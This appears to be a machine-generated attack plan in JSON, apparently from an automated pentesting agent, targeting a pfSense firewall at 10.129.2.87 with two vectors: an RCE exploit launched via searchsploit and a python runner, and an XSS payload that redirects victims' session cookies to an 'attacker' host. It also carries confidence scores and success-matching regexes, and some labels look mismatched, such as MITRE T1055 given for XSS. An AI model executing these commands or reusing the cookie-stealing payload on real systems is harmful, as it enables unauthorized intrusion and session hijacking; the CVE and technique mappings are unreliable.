{
  "plan_id": "plan_20241219_001",
  "target_ip": "10.129.2.87",
  "context_hash": "pfsense_lighttpd_1435_ssl_weak",
  "attack_vectors": [
    {
      "vector_id": "vec_01",
      "priority": 1,
      "action": {
        "tool_name": "exploit_runner",
        "command_template": "searchsploit -m {exploit_id} && python3 {exploit_file} --target {target} --port {port}",
        "parameters": {
          "target": "10.129.2.87",
          "port": 443,
          "exploit_id": "metasploit_pfsense_rce",
          "exploit_file": "pfsense_rce.py"
        },
        "timeout_seconds": 60
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "RCE",
          "mitre_id": "T1190",
          "cve_id": "CVE-2014-4688"
        },
        "hypothesis": {
          "confidence_score": 0.75,
          "rationale_tags": [
            "pfsense_confirmed",
            "lighttpd_1.4.35",
            "port_443_open",
            "metasploit_module"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "regex_match",
          "match_pattern": "(shell|command|root|uid=0|exploit successful)",
          "negative_pattern": "(404|403|Connection refused|Authentication failed)"
        }
      },
      "rag_context": {
        "payload_snippet": "Metasploit RCE module for pfSense authenticated command execution",
        "insight": "pfSense web interface vulnerable to authenticated RCE via command injection",
        "exploitation_logic": "May require session bypass or credential harvesting first",
        "vulnerability_context": "Affects pfSense versions with web interface access on port 443",
        "source": "searchsploit_pfsense_collection"
      }
    },
    {
      "vector_id": "vec_02",
      "priority": 2,
      "action": {
        "tool_name": "exploit_runner",
        "command_template": "searchsploit -m {exploit_id} && python3 {exploit_file} --target {target} --port {port} --payload '{payload}'",
        "parameters": {
          "target": "10.129.2.87",
          "port": 443,
          "exploit_id": "CVE-2010-4412",
          "exploit_file": "pfsense_xss.py",
          "payload": "<script>document.location='http://attacker/'+document.cookie</script>"
        },
        "timeout_seconds": 30
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "XSS",
          "mitre_id": "T1055",
          "cve_id": "CVE-2010-4412"
        },
        "hypothesis": {
          "confidence_score": 0.65,
          "rationale_tags": [
            "pfsense_xss",
            "4_variants",
            "core_modules",
            "session_hijack_potential"
          ],
          "expected_success": false
        },
        "success_criteria": {
          "match_type": "regex_match",
          "match_pattern": "(XSS|script|alert|cookie|session)",
          "negative_pattern": "(blocked|filtered|sanitized)"
        }
      },
      "rag_context": {
        "payload_snippet": "XSS payloads targeting pfSense core modules for session hijacking",
        "insight": "Multiple XSS variants available, may require filter bypass techniques",
        "exploitation_logic": "Session cookie harvesting for authentication bypass",
        "vulnerability_context": "CVE-2010-4412 affects pfSense core module interfaces",
        "source": "searchsploit_pfsense_xss"
      }
    }
  ],
  "created_at": "2024-12-19T10:30:00Z"
}